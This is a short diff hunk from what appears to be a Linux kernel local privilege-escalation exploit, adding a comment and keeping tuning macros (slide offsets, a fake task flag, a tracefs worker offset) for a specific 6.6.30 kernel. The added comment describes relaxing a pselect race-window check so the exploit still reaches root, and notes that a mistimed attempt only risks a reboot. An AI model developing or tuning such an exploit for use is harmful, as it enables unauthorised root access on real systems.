@@ -20,6 +20,11 @@
 #define SLIDE_WAITER_WAKE_STATE 0
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
 #define SLIDE_USE_FAKE_TASK 1
+/* 6.6.30 AYDQ: pselect almost always times out (ret=0) with the waiter
+ * correctly placed (sched_ok=1), in both slide and fops routes, so the
+ * default ret>0 write-window gate never opens. Accept sched_ok-only
+ * (Makefile: -DAPP_PSELECT_WINDOW_SCHED_OK=1). Verified attempt still
+ * gates root; a mistimed window risks only a reboot. */
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d7ca0ULL
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x150000ULL, 0x100000ULL, 0x130000ULL, 0x090000ULL, \
